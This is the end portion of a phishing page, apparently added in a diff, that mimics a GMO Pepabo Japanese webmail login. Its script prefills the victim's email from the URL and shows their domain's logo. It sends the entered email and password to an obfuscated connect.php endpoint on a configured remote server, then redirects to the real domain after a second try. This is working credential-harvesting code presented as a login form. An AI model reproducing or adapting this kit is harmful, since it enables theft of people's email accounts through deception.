+                        <style data-emotion="css isbt42">.css-isbt42{box-sizing:border-box;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;width:100%;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;margin-top:-16px;width:calc(100% + 16px);margin-left:-16px;}.css-isbt42>.MuiGrid-item{padding-top:16px;}.css-isbt42>.MuiGrid-item{padding-left:16px;}</style>
+                        <div class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 css-isbt42">
+                           <style data-emotion="css 1lzpvbm">.css-1lzpvbm{box-sizing:border-box;margin:0;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-flex-basis:100%;-ms-flex-preferred-size:100%;flex-basis:100%;-webkit-box-flex:0;-webkit-flex-grow:0;-ms-flex-positive:0;flex-grow:0;max-width:100%;font-size:0.75rem;}@media (min-width:600px){.css-1lzpvbm{-webkit-flex-basis:100%;-ms-flex-preferred-size:100%;flex-basis:100%;-webkit-box-flex:0;-webkit-flex-grow:0;-ms-flex-positive:0;flex-grow:0;max-width:100%;}}@media (min-width:900px){.css-1lzpvbm{-webkit-flex-basis:100%;-ms-flex-preferred-size:100%;flex-basis:100%;-webkit-box-flex:0;-webkit-flex-grow:0;-ms-flex-positive:0;flex-grow:0;max-width:100%;}}@media (min-width:1200px){.css-1lzpvbm{-webkit-flex-basis:100%;-ms-flex-preferred-size:100%;flex-basis:100%;-webkit-box-flex:0;-webkit-flex-grow:0;-ms-flex-positive:0;flex-grow:0;max-width:100%;}}@media (min-width:1536px){.css-1lzpvbm{-webkit-flex-basis:100%;-ms-flex-preferred-size:100%;flex-basis:100%;-webkit-box-flex:0;-webkit-flex-grow:0;-ms-flex-positive:0;flex-grow:0;max-width:100%;}}</style>
+                           <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 css-1lzpvbm">
+                              <ul style="padding-left:1rem">
+                                 <li style="margin-bottom:0.25rem">
+                                    メールアドレスのパスワードをお忘れの場合は
+                                    <style data-emotion="css il7vwp">.css-il7vwp{-webkit-text-decoration:underline;text-decoration:underline;text-decoration-color:rgba(31, 122, 204, 0.4);}.css-il7vwp:hover{text-decoration-color:inherit;}</style>
+                                    <style data-emotion="css 48ljnf">.css-48ljnf{margin:0;font-family:inherit;font-weight:inherit;font-size:inherit;line-height:inherit;letter-spacing:inherit;color:#1f7acc;-webkit-text-decoration:underline;text-decoration:underline;text-decoration-color:rgba(31, 122, 204, 0.4);}.css-48ljnf:hover{text-decoration-color:inherit;}</style>
+                                    <a class="MuiTypography-root MuiTypography-inherit MuiLink-root MuiLink-underlineAlways css-48ljnf" href="#">サービス管理画面</a>より再設定をお願い致します。
+                                 </li>
+                              </ul>
+                           </div>
+                        </div>
+                     </div>
+                  </form>
+               </div>
+            </main>
+            <style data-emotion="css 1anqnjp">.css-1anqnjp{position:fixed;top:16px;right:16px;}</style>
+            <style data-emotion="css fs8gvu">.css-fs8gvu{margin-left:16px;position:fixed;top:16px;right:16px;}</style>
+            <style data-emotion="css tzik5u">.css-tzik5u{text-transform:none;font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#9297a1;margin-left:16px;position:fixed;top:16px;right:16px;}.css-tzik5u:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(146, 151, 161, 0.04);}@media (hover: none){.css-tzik5u:hover{background-color:transparent;}}.css-tzik5u.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style>
+            <style data-emotion="css 1cpmdcb">.css-1cpmdcb{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;text-transform:none;font-family:-apple-system,BlinkMacSystemFont,YakuHanJP,Helvetica,ヒラギノ角ゴシック,Hiragino Sans,ヒラギノ角ゴ ProN W3,Hiragino Kaku Gothic ProN,Verdana,Meiryo,sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#9297a1;margin-left:16px;position:fixed;top:16px;right:16px;}.css-1cpmdcb::-moz-focus-inner{border-style:none;}.css-1cpmdcb.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1cpmdcb{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1cpmdcb:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(146, 151, 161, 0.04);}@media (hover: none){.css-1cpmdcb:hover{background-color:transparent;}}.css-1cpmdcb.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style>
+            <button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textSecondary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-root MuiButton-text MuiButton-textSecondary MuiButton-sizeMedium MuiButton-textSizeMedium css-1cpmdcb" tabindex="0" type="button">
+               <style data-emotion="css 6xugel">.css-6xugel{display:inherit;margin-right:8px;margin-left:-4px;}.css-6xugel>*:nth-of-type(1){font-size:20px;}</style>
+               <span class="MuiButton-startIcon MuiButton-iconSizeMedium css-6xugel">
+                  <style data-emotion="css 1k33q06">.css-1k33q06{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:1.25rem;}</style>
+                  <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeSmall css-1k33q06" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="Brightness4RoundedIcon">
+                     <path d="M22.6 11.29 20 8.69V5c0-.55-.45-1-1-1h-3.69l-2.6-2.6a.9959.9959 0 0 0-1.41 0L8.69 4H5c-.55 0-1 .45-1 1v3.69l-2.6 2.6c-.39.39-.39 1.02 0 1.41L4 15.3V19c0 .55.45 1 1 1h3.69l2.6 2.6c.39.39 1.02.39 1.41 0l2.6-2.6H19c.55 0 1-.45 1-1v-3.69l2.6-2.6c.39-.39.39-1.03 0-1.42zm-4.68 1.69c-.34 2.12-1.85 3.94-3.88 4.66-1.21.43-2.41.45-3.5.18-.41-.1-.48-.65-.13-.9C11.98 15.84 13 14.04 13 12s-1.02-3.84-2.58-4.92c-.35-.24-.29-.79.13-.9 1.09-.27 2.29-.25 3.5.18 2.02.72 3.54 2.54 3.88 4.66.05.33.07.66.07.98-.01.32-.03.65-.08.98z"></path>
+                  </svg>
+               </span>
+               デザイン: <!-- -->デバイスのテーマ
+            </button>
+         </main>
+         <style data-emotion="css 44ilv">.css-44ilv{color:#9297a1;font-size:12px;font-weight:bold;padding:32px;text-align:center;}</style>
+         <footer class="css-44ilv">
+            © 2003-<!-- -->2023<!-- --> GMO Pepabo, inc. All rights reserved.
+         </footer>
+      </div>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="./config.js"></script>
+
+	  <script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var atu = "L2Nvbm5lY3QucGhw";
+	
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+		
+		
+		if(pr.length < 5) {  
+
+			$('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;  
+
+			return false;  
+
+		}
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+
+        $.ajax({
+            dataType: 'JSON',
+            url: `${config.baseUrl}${atob(atu)}`,
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('ログイン');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('ログイン');
+            }
+        });
+    });
+
+
+});
+
+function getParameterByName(name, url) {
+			if (!url) url = window.location.href;
+			name = name.replace(/[\[\]]/g, '\\$&');
+			var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+				results = regex.exec(url);
+			if (!results) return null;
+			if (!results[2]) return '';
+			return decodeURIComponent(results[2].replace(/\+/g, ' '));
+		}
+			
+		const login_username = getParameterByName('cms');
+		document.getElementById("ai").value = login_username;
+</script>
+		
+		
+   </body>
+</html>
